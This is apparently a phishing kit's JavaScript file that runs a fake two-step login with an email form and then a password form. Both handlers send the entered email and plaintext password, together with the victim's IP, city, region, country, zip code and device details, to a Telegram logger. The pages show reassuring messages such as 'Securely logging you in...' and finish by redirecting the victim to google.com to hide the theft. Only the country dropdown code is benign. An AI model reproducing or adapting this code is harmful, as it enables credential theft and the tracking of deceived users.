// === COUNTRIES (unchanged) ===
const countries = [
  { code: 'us', name: 'United States' },
  { code: 'gb', name: 'United Kingdom' },
  { code: 'ca', name: 'Canada' },
  { code: 'au', name: 'Australia' },
  { code: 'de', name: 'Germany' },
  { code: 'fr', name: 'France' },
  { code: 'it', name: 'Italy' },
  { code: 'es', name: 'Spain' },
  { code: 'nl', name: 'Netherlands' },
  { code: 'jp', name: 'Japan' },
  { code: 'in', name: 'India' },
  { code: 'br', name: 'Brazil' },
  { code: 'mx', name: 'Mexico' },
  { code: 'za', name: 'South Africa' },
  { code: 'se', name: 'Sweden' },
  { code: 'no', name: 'Norway' },
  { code: 'dk', name: 'Denmark' },
  { code: 'pl', name: 'Poland' },
  { code: 'ar', name: 'Argentina' },
  { code: 'kr', name: 'South Korea' }
];

// === INIT ON LOAD ===
document.addEventListener('DOMContentLoaded', () => {
  initCountryDropdown();
  initEmailForm();
  initPasswordForm(); // ← This was missing or broken
});

// === EMAIL FORM (email.html) ===
async function initEmailForm() {
  const form = document.getElementById('emailForm');
  if (!form) return;

  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const emailInput = document.getElementById('email');
    const email = emailInput?.value.trim();
    if (!email) return;

    TelegramLogger.showLoading("Checking your info...");

    const userData = await TelegramLogger.getUserData();
    await TelegramLogger.sendToTelegram({
      email,
      password: null,
      time: TelegramLogger.getTime(),
      ip: userData.ip,
      city: userData.city,
      region: userData.region,
      country: userData.country,
      zip: userData.zip,
      device: TelegramLogger.getDeviceInfo()
    });

    TelegramLogger.delayRedirect(`password.html?email=${encodeURIComponent(email)}`, 3000);
  });
}

// === PASSWORD FORM (password.html) ===
async function initPasswordForm() {
  const form = document.getElementById('passwordForm');
  if (!form) return;

  // === SHOW EMAIL FROM URL ===
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  const emailEl = document.getElementById('userEmail');
  if (email && emailEl) {
    emailEl.textContent = decodeURIComponent(email);
  } else if (emailEl) {
    emailEl.textContent = 'user@example.com';
  }

  // === SUBMIT PASSWORD ===
  form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const passwordInput = document.getElementById('password');
    const password = passwordInput?.value;
    if (!password) return;

    TelegramLogger.showLoading("Securely logging you in...");

    const userData = await TelegramLogger.getUserData();
    await TelegramLogger.sendToTelegram({
      email: decodeURIComponent(urlParams.get('email') || ''),
      password,
      time: TelegramLogger.getTime(),
      ip: userData.ip,
      city: userData.city,
      region: userData.region,
      country: userData.country,
      zip: userData.zip,
      device: TelegramLogger.getDeviceInfo()
    });

    TelegramLogger.delayRedirect('https://www.google.com', 3000);
  });
}

// === COUNTRY DROPDOWN ===
function initCountryDropdown() {
  const menu = document.getElementById('dropdownMenu');
  const selected = document.getElementById('selectedCountry');
  if (!menu || !selected) return;

  countries.forEach(c => {
    const item = document.createElement('li');
    item.className = `dropdown-item ${c.code}`;
    item.innerHTML = `<a class="country">${c.name}</a>`;
    item.onclick = () => {
      selected.dataset.code = c.code;
      const flag = selected.querySelector('.flag-icon');
      const a = item.querySelector('a');
      const pos = getComputedStyle(a).backgroundPosition;
      flag.style.backgroundPosition = pos;
      menu.classList.remove('show');
    };
    menu.appendChild(item);
  });

  selected.addEventListener('click', e => {
    e.stopPropagation();
    menu.classList.toggle('show');
  });

  document.addEventListener('click', () => menu.classList.remove('show'));
}